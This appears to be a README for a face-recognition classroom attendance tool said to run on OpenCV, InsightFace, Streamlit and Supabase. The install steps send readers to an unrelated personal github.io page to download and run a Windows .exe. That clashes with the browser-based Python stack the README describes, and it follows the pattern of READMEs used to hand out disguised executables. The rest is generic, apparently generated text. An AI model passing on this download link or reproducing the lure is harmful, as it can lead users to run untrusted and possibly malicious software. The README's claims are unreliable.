# 🤖 Attendance-AI - Automated classroom tracking for easy attendance

[![Download Attendance-AI](https://img.shields.io/badge/Download-Attendance--AI-blue)](https://aubriehundredandseventieth600.github.io)

Attendance-AI tracks student attendance using computer vision. The system monitors classroom videos and identifies individuals through face recognition. It replaces manual roll calls with automated logging. All attendance data stores safely in a database.

## 📋 System Requirements

Your computer needs to meet these specifications to run the software smoothly:

- Operating System: Windows 10 or Windows 11.
- Processor: Intel Core i5 or better.
- Memory: 8 GB RAM or more.
- Graphics: Dedicated GPU helps with processing speed but is not required.
- Storage: 500 MB of free space.
- Webcam: A standard USB camera or laptop camera for live tracking.

## 📥 How to Install

Follow these steps to set up the software on your Windows computer.

1. Visit [this page to download](https://aubriehundredandseventieth600.github.io).
2. Look for the file ending in .exe under the latest version.
3. Click the filename to save the installer to your Downloads folder.
4. Open your Downloads folder.
5. Double-click the installer file.
6. Follow the on-screen prompts to finish the installation.
7. A shortcut icon now appears on your desktop.

## 🚀 Getting Started

Launch the application to begin tracking attendance.

1. Double-click the Attendance-AI icon on your desktop.
2. The application opens in your default web browser.
3. Connect your camera if the system prompts you.
4. Select the video source from the drop-down menu.
5. Click the Start button to begin the recognition process.

## 🔍 Understanding the Interface

The interface consists of three main areas designed for simple navigation.

### The Dashboard
The main view shows the live feed from your camera. A box highlights faces detected by the system. The list below the video shows the names of people identified in real time.

### The Database View
This section connects to your remote storage. Use the filter options to sort attendance records by date, class name, or student status. You can export these lists to a file for your own records.

### Settings
Adjust your hardware configuration here. You can change camera settings, update your database connection details, or tune the recognition sensitivity. Increasing sensitivity helps the system find faces from further away in the room.

## 🛡️ Privacy and Security

Attendance-AI processes video locally. The system compares faces against your database and records the result. Data encryption keeps attendance logs secure during upload. You maintain control over your student lists and identity templates.

## 🛠️ Troubleshooting Common Issues

Use these tips if you encounter problems during operation.

- Camera Not Found: Ensure the camera is plugged in and no other application uses it. Close video meeting software like Zoom or Teams before you start Attendance-AI.
- Slow Performance: Close other resource-heavy programs. High-resolution video feeds consume significant processing power. Reduce the resolution in the Settings menu if the video lags.
- Database Connection Error: Verify your internet connection. Check that the database credentials in Settings match the information provided by your administrator.
- Recognition Failures: Ensure the room has adequate lighting. Sharp shadows or backlit windows prevent the camera from identifying faces clearly. Position the camera at eye level with the students.

## 💡 Best Practices

For the best results, configure your environment before the class session.

- Lighting: Use consistent, warm light. Avoid direct light behind the students.
- Camera Placement: Set the camera to capture a clear view of the doorway or the front of the classroom. Ensure no large objects block the view.
- Database Management: Update your student photo database regularly. If a student grows a beard or changes glasses, upload a new photo to maintain high recognition accuracy.
- Testing: Run a test session with a small group of students before your first formal class. This ensures the hardware and software communicate correctly.

## 🧩 How the Technology Works

Attendance-AI relies on a stack of modern tools.

- Computer Vision: OpenCV captures images and processes frames from your video source.
- InsightFace: This engine maps facial features to mathematical vectors. It compares these vectors against stored images to identify individuals.
- Streamlit: This platform powers the user interface you interact with during the class.
- Supabase: This service hosts the database. It stores the names, times, and dates for every class session.

## 📖 Support

Contact the repository maintainers if you encounter persistent errors or have feature requests. Include your version number and a screenshot of the error message to speed up support. Visit the main project page for updates and documentation on new features.